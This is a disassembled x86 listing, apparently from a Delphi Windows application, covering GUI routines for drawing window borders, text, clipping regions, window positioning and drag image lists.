mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_453b49
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_453770
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44d914
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_453b88
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44e798
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_44c1b4
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_453bd0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e9b8
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_453c00
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_4533bc
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_44f950
xor ecx ecx
push ebp
push sub_453d2f
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_44fde8
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_44fde8
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453d36
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_44f958
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44fdac
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_453d36
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_4034a4
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_4034a4
jmp r-xdata
sub_453dcc
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44da78
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44da78
sub_453e10
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_44da78
sub_453e80
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_453f10
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_454176
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424ca4
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_43d448
call sub_43d528
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_43d448
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_43dc74
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_4541b8
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406d24
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_44c3b8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_4509a4
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_44da78
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_44ec3c
sub_454224
push ebx
push esi
mov esi edx
call sub_464294
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406c90
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44da78
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406c90
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44da78
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_454288
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_450d6c
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4542c0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4542b8
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_454300
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44b94c
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e50
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_44b428
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_45435c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_4032a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44ba24
test bl bl
jle r-xdata
xor eax eax
call sub_449a18
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_45439c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425154
xor eax eax
push ebp
push sub_454437
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4255f0
xor eax eax
push ebp
push sub_454414
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45441b
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_4255f0
retn
sub_454448
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_454d80
mov edx 0x80ffff
mov eax esi
call sub_44ca14
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_42546c
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424d8c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4544b4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44ff44
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c200
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44fedc
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_454520
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_454576
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45457d
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call ReleaseDC
retn
sub_454584
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_45461d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_4244a4
mov eax ebx
call sub_44ebe4
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x14 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x208 ]
call sub_425570
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454624
lea eax [ ebp - 0x14 ]
call sub_404038
retn
sub_45462c
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_454698
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_454723
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45472a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_44c874
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_4253ac
mov edx eax
add edx 0x6
mov eax esi
call sub_44c008
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_44c874
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_4253c8
mov edx eax
add edx 0x4
mov eax esi
call sub_44c02c
sub_454730
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_454909
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44c8a4
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44db1c
mov eax [ esi ]
call sub_46aacc
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_46aad8
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_46aacc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_46aac0
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_46aad8
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_46aab4
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_46aac0
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_46aab4
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4507ec
push 0x4
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454910
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_4042f8
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4579c8
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call [ rw-data ]
sub_454918
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_454940
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_417298
mov eax esi
call sub_44ebe4
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ esi + 0x208 ]
call sub_425570
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_45499c
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_417298
call sub_43d448
call sub_43d528
test al al
jne r-xdata
call sub_43d448
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_43d8e8
push esp
push 0x1
push 0xf
push 0x0
call sub_43d448
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_43d5e8
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_454a08
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_4510f4
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_454a2c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_454a84
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454b44
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46afe8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42c51c
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46afe8
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42c51c
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
